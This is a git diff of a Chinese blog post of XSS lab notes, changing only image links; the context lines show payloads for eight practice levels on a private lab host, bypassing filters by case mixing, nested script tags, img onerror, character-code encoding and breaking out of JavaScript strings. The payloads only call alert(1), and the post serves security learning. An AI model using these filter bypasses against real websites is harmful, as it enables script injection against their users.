@@ -20,7 +20,7 @@ date: 2016-03-23 21:47:05
     <script>alert(1)</script> 
 
     http://10.211.55.7/xss/example1.php?name=<script>alert(1)</script>
-![](http://7xrahm.com1.z0.glb.clouddn.com/blog/XSS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/XSS-1.png?)
+![](https://ws3.sinaimg.cn/large/006tNc79gy1fvo6z3pfgxj31940o2dpd.jpg)
 
 ## 2. 第二关
 过滤掉了**小写**的**script**, 可以使用大小写混合的方法绕过。
@@ -28,7 +28,7 @@ date: 2016-03-23 21:47:05
     <sCrIpt>alert(1)</sCriPt>
 
     http://10.211.55.7/xss/example1.php?name=<sCrIpt>alert(1)</sCriPt>
-![](http://7xrahm.com1.z0.glb.clouddn.com/blog/XSS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/XSS-2.png?)
+![](https://ws1.sinaimg.cn/large/006tNc79gy1fvo6z6hos4j31ak0lwqby.jpg)
 
 ## 3. 第三关
 过滤了**不区分大小写**的`<script>`与`</script>`，可以使用**嵌套**的script标签绕过。
@@ -36,7 +36,7 @@ date: 2016-03-23 21:47:05
     <sc<script>ript>alert(1)</sc</script>ript>
 
     http://10.211.55.7/xss/example1.php?name=<sc<script>ript>alert(1)</sc</script>ript>
-![](http://7xrahm.com1.z0.glb.clouddn.com/blog/XSS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/XSS-3.png?)
+![](https://ws3.sinaimg.cn/large/006tNc79gy1fvo6z7f3ldj317s0l07cf.jpg)
 
 ## 4. 第四关
 判断包含`script`字符串即报错, 可以使用其他标签如`img`绕过。
@@ -44,7 +44,7 @@ date: 2016-03-23 21:47:05
     <img src=x onerror="alert(1)">
 
     http://10.211.55.7/xss/example1.php?name=<img src=x onerror="alert(1)">
-![](http://7xrahm.com1.z0.glb.clouddn.com/blog/XSS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/XSS-4.png?)
+![](https://ws3.sinaimg.cn/large/006tNc79gy1fvo6z8tzxzj31680kaqaq.jpg)
 
 ## 5. 第五关
 判断包含alert字符串即报错, 可以使用编码方式绕过。
@@ -54,7 +54,7 @@ date: 2016-03-23 21:47:05
     <img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">
 
     http://10.211.55.7/xss/example1.php?name=<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
-![](http://7xrahm.com1.z0.glb.clouddn.com/blog/XSS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/XSS-5.png?)
+![](https://ws3.sinaimg.cn/large/006tNc79gy1fvo6zc3utaj318i0lmait.jpg)
 
 ## 6. 第六关
 直接在js环境中输出php变量, 可以通过构造js脚本绕过。
@@ -66,7 +66,7 @@ date: 2016-03-23 21:47:05
     </script><script>alert(1)// (通过直接闭合前前后`script`来达到目的, 该方法在第七关不可用, 因为`<`和`>`被实体编码了/(ㄒoㄒ)/~~)
 
     http://10.211.55.7/xss/example1.php?name=";b=alert(1);eval(b);//
-![](http://7xrahm.com1.z0.glb.clouddn.com/blog/XSS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/XSS-6.png?)
+![](https://ws1.sinaimg.cn/large/006tNc79gy1fvo6zd0e96j316c0kyn53.jpg)
 
 ## 7. 第七关
 在js环境中输出通过html编码的php变量, `htmlentities`没有过滤单引号, 使用单引号绕过。
@@ -76,7 +76,7 @@ date: 2016-03-23 21:47:05
     ';alert(1);//
 
     http://10.211.55.7/xss/example1.php?name=';b=alert(1);eval(b);//
-![](http://7xrahm.com1.z0.glb.clouddn.com/blog/XSS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/XSS-7.png?)
+![](https://ws1.sinaimg.cn/large/006tNc79gy1fvo6zdyohaj316s0kk7c5.jpg)
 
 ## 8. 第八关
 第八个xss的post地址使用了当前url, 达到构造当前url地址达到xss目的
@@ -84,7 +84,7 @@ date: 2016-03-23 21:47:05
     /"method="post"><script>alert(1)</script>
 
     http://10.211.55.7/xss/example1.php/"method="post"><script>alert(1)</script>
-![](http://7xrahm.com1.z0.glb.clouddn.com/blog/XSS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/XSS-8.png?)
+![](https://ws3.sinaimg.cn/large/006tNc79gy1fvo6zevnqej316u0kqtgm.jpg)
 
 另外, 介绍另外几个**payload**
 
